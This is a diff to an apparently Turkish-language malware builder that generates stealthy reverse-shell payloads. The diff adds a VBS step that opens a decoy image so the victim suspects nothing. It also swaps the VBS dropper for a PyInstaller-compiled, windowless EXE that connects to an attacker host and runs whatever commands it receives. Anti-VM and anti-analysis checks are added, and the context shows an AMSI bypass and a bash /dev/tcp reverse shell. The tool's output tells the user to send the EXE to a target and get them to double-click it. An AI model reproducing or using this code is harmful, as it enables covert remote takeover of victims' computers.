@@ -199,8 +199,13 @@ WScript.Sleep Int((8000 - 3000 + 1) * Rnd + 3000)
 Set sh = CreateObject("WScript.Shell")
 '''
 
-    # Key ve payload'ı doğrudan VBS'e göm
+    # Görseli aç (şüphe uyandırmasın) + Key ve payload'ı doğrudan VBS'e göm
     vbs += f'''
+' ── Görseli Aç (masum görüntüsü) ──
+Dim myDir
+myDir = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\\"))
+sh.Run """" & myDir & "photo.png" & """", 1, False
+
 ' ── Gömülü Payload (Base64 + XOR Şifreli) ──
 Dim keyB64, payB64
 keyB64 = "{key_b64}"
@@ -280,7 +285,7 @@ def c2_payload_builder():
 
     print_line()
     print(f"\n{C.BLUE}{C.BOLD}  --- Hedef Sistem ---{C.RESET}")
-    print(f"  {C.CYAN}1){C.RESET} Windows (Tek Dosya VBS Payload)")
+    print(f"  {C.CYAN}1){C.RESET} Windows (Tek EXE Payload)")
     print(f"  {C.CYAN}2){C.RESET} Linux (Bash Reverse Shell)")
 
     os_choice = input(f"\n{C.CYAN}  [>] Seçiminiz: {C.RESET}").strip()
@@ -291,34 +296,119 @@ def c2_payload_builder():
         anti_sb_input = input(f"\n{C.CYAN}  [?] Anti-VM/Sandbox koruması açılsın mı? {C.DIM}(Kendi PC'nizde test için 'H'){C.RESET} [E/h]: ").strip().lower()
         anti_sb = False if anti_sb_input == 'h' else True
 
-        # Payload'ı oluştur
-        amsi = build_amsi_bypass()
-        shell = build_evasive_ps(lhost, lport)
-        full_ps = amsi + ";" + shell
+        exe_name = input(f"{C.CYAN}  [?] EXE dosya adı {C.DIM}[setup]{C.RESET}: ").strip() or "setup"
 
-        # XOR şifrele
-        key = xor_key(32)
-        enc = xor_crypt(full_ps, key)
-        pay_b64 = base64.b64encode(enc).decode()
-        key_b64 = base64.b64encode(key).decode()
+        print(f"\n{C.YELLOW}  [*] Payload oluşturuluyor...{C.RESET}")
 
-        # Tek dosya VBS oluştur
-        vbs_content = build_standalone_vbs(key_b64, pay_b64, anti_sandbox=anti_sb)
-        
+        # Reverse shell Python scripti oluştur
         output_dir = "stealth_dropper"
         os.makedirs(output_dir, exist_ok=True)
-        vbs_path = os.path.join(output_dir, "payload.vbs")
-        save_text(vbs_path, vbs_content)
+        stub_path = os.path.join(output_dir, "_stub.py")
 
-        print(f"\n{C.GREEN}{C.BOLD}  ╔══════════════════════════════════════════════════╗{C.RESET}")
-        print(f"{C.GREEN}{C.BOLD}  ║  ✅ TEK DOSYA PAYLOAD HAZIR!                     ║{C.RESET}")
-        print(f"{C.GREEN}{C.BOLD}  ╚══════════════════════════════════════════════════╝{C.RESET}")
-        print(f"\n{C.WHITE}  📁 Dosya  : {os.path.abspath(vbs_path)}{C.RESET}")
-        print(f"{C.WHITE}  🔐 Şifre  : XOR (Base64 gömülü, harici dosya yok){C.RESET}")
-        print(f"{C.WHITE}  🛡️  Anti-SB: {'Açık' if anti_sb else 'Kapalı (Test Modu)'}{C.RESET}")
-        print(f"{C.WHITE}  🎯 Hedef  : {lhost}:{lport}{C.RESET}")
-        print(f"\n{C.YELLOW}  [!] Bu dosyayı hedef makineye gönderip çift tıklatmanız yeterli.{C.RESET}")
-        print(f"{C.YELLOW}  [!] Listener'ınızı başlatmayı unutmayın: Menüden 2) Listener{C.RESET}")
+        anti_sb_code = ""
+        if anti_sb:
+            anti_sb_code = """
+import ctypes, time
+# Zamanlama kontrolü
+t1 = time.time()
+time.sleep(1.5)
+if time.time() - t1 < 1:
+    raise SystemExit
+# VM kontrolü
+try:
+    import subprocess as _sp
+    _r = _sp.run(['wmic','computersystem','get','manufacturer,model'],capture_output=True,text=True)
+    _o = _r.stdout.lower()
+    for _v in ['vmware','virtualbox','xen','virtual']:
+        if _v in _o:
+            raise SystemExit
+except:
+    pass
+# Analiz aracı kontrolü
+try:
+    _r = _sp.run(['tasklist'],capture_output=True,text=True)
+    _t = _r.stdout.lower()
+    for _b in ['wireshark','procmon','x64dbg','ollydbg','ida','fiddler','processhacker']:
+        if _b in _t:
+            raise SystemExit
+except:
+    pass
+"""
+
+        stub_code = f'''import socket,subprocess,os,threading,time,sys
+{anti_sb_code}
+def _r():
+    while True:
+        try:
+            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            s.connect(("{lhost}",{lport}))
+            while True:
+                d=s.recv(4096).decode("utf-8","replace")
+                if not d:break
+                try:
+                    p=subprocess.run(d,shell=True,capture_output=True,text=True,timeout=30)
+                    o=p.stdout+p.stderr
+                    if not o:o="(boş çıktı)\\n"
+                except Exception as e:
+                    o=str(e)+"\\n"
+                o+=os.getcwd()+"> "
+                s.send(o.encode("utf-8","replace"))
+            s.close()
+        except:
+            time.sleep(5)
+_r()
+'''
+        save_text(stub_path, stub_code)
+
+        print(f"{C.YELLOW}  [*] PyInstaller ile EXE derleniyor (bu biraz sürebilir)...{C.RESET}")
+
+        # PyInstaller ile derle
+        exe_out = os.path.join(output_dir, exe_name + ".exe")
+        result = subprocess.run(
+            [sys.executable, "-m", "PyInstaller",
+             "--onefile", "--noconsole", "--clean",
+             "--distpath", output_dir,
+             "--workpath", os.path.join(output_dir, "_build"),
+             "--specpath", os.path.join(output_dir, "_build"),
+             "--name", exe_name,
+             stub_path],
+            capture_output=True, text=True
+        )
+
+        # Temizlik
+        for cleanup in [stub_path,
+                        os.path.join(output_dir, "_build"),
+                        os.path.join(output_dir, f"{exe_name}.spec") if os.path.exists(os.path.join(output_dir, f"{exe_name}.spec")) else None]:
+            if cleanup and os.path.exists(cleanup):
+                try:
+                    if os.path.isdir(cleanup):
+                        shutil.rmtree(cleanup, ignore_errors=True)
+                    else:
+                        os.remove(cleanup)
+                except:
+                    pass
+
+        if os.path.exists(exe_out):
+            exe_size = os.path.getsize(exe_out) / (1024*1024)
+            print(f"\n{C.GREEN}{C.BOLD}  ╔══════════════════════════════════════════════════════╗{C.RESET}")
+            print(f"{C.GREEN}{C.BOLD}  ║  ✅ TEK DOSYA EXE PAYLOAD HAZIR!                     ║{C.RESET}")
+            print(f"{C.GREEN}{C.BOLD}  ╚══════════════════════════════════════════════════════╝{C.RESET}")
+            print(f"\n{C.WHITE}  📁 Dosya   : {os.path.abspath(exe_out)}{C.RESET}")
+            print(f"{C.WHITE}  📦 Boyut   : {exe_size:.1f} MB{C.RESET}")
+            print(f"{C.WHITE}  🛡️  Anti-SB : {'Açık' if anti_sb else 'Kapalı (Test Modu)'}{C.RESET}")
+            print(f"{C.WHITE}  🎯 Hedef   : {lhost}:{lport}{C.RESET}")
+            print(f"\n{C.YELLOW}  [!] Bu EXE'yi hedefe gönderip çift tıklatmanız yeterli.{C.RESET}")
+            print(f"{C.YELLOW}  [!] Pencere açılmaz, arka planda sessizce çalışır.{C.RESET}")
+            print(f"{C.YELLOW}  [!] Listener'ınızı başlatmayı unutmayın: Menüden 2) Listener{C.RESET}")
+
+            # Klasörü otomatik aç
+            if os.name == 'nt':
+                os.startfile(os.path.abspath(output_dir))
+        else:
+            print(f"\n{C.RED}  [-] EXE oluşturulamadı!{C.RESET}")
+            if result.stderr:
+                print(f"{C.RED}  [-] Hata: {result.stderr[:500]}{C.RESET}")
+            print(f"{C.YELLOW}  [!] PyInstaller kurulu mu? 'pip install pyinstaller' ile kurun.{C.RESET}")
 
     elif os_choice == '2':
         payload = f"#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
